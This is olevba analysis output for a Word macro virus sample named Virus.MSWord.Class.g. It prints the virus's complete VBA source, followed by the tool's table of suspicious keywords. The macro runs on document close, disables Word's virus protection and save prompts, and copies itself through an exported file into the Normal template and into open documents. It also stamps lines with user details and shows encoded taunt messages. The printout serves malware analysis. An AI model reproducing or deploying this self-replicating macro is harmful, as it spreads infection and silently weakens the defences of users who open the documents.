olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.g-ad1b542b987c4b14ddb44dadf18eaa3a766ab1ab
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.g-ad1b542b987c4b14ddb44dadf18eaa3a766ab1ab - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'xLock15.12.04 13:20:38Class
On Error GoTo out
'xLock15.12.04 13:20:38Class
Options.VirusProtection = False
'xLock15.12.04 13:20:38Class
Options.SaveNormalPrompt = False
'xLock15.12.04 13:20:38Class
Options.ConfirmConversions = False
'xLock15.12.04 13:20:38Class
cores = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'xLock15.12.04 13:20:38Class
corer = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'xLock15.12.04 13:20:38Class
If corer > 70 And cores > 0 Then GoTo out
'xLock15.12.04 13:20:38Class
If corer < 70 Then
'xLock15.12.04 13:20:38Class
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'xLock15.12.04 13:20:38Class
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'xLock15.12.04 13:20:38Class
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\core.sys"
'xLock15.12.04 13:20:38Class
End If
'xLock15.12.04 13:20:38Class
If cores = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'xLock15.12.04 13:20:38Class
Infection = Int(Rnd * 100)
'xLock15.12.04 13:20:38Class
If Infection = 99 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(67) + Chr(111) + Chr(82) + Chr(101) + Chr(32) + Chr(66) + Chr(121) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)
'xLock15.12.04 13:20:38Class
If Day(Now) = 13 And (Month(Now) > 11) Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(80) + Chr(82) + Chr(79) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)
'xLock15.12.04 13:20:38Class
host.codemodule.AddFromFile ("c:\core.sys")
'xLock15.12.04 13:20:38Class
With host.codemodule
'xLock15.12.04 13:20:38Class
    For x = 1 To 4
'xLock15.12.04 13:20:38Class
    .deletelines 1
'xLock15.12.04 13:20:38Class
    Next x
'xLock15.12.04 13:20:38Class
End With
'xLock15.12.04 13:20:38Class
If corer < 70 Then
'xLock15.12.04 13:20:38Class
    With host.codemodule
'xLock15.12.04 13:20:38Class
    .replaceline 1, "Sub AutoClose()"
'xLock15.12.04 13:20:38Class
    .replaceline 75, "Sub ToolsMacro()"
'xLock15.12.04 13:20:38Class
    End With
'xLock15.12.04 13:20:38Class
End If
'xLock15.12.04 13:20:38Class
With host.codemodule
'xLock15.12.04 13:20:38Class
    For x = 2 To 72 Step 2
'xLock15.12.04 13:20:38Class
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'xLock15.12.04 13:20:38Class
    Next x
'xLock15.12.04 13:20:38Class
End With
'xLock15.12.04 13:20:38Class
out:
'xLock15.12.04 13:20:38Class
If corer > 70 And cores = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'xLock15.12.04 13:20:38Class
End Sub

Sub ToolsMacro()
'Word97/Core by Virus, Thanks Vic.
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

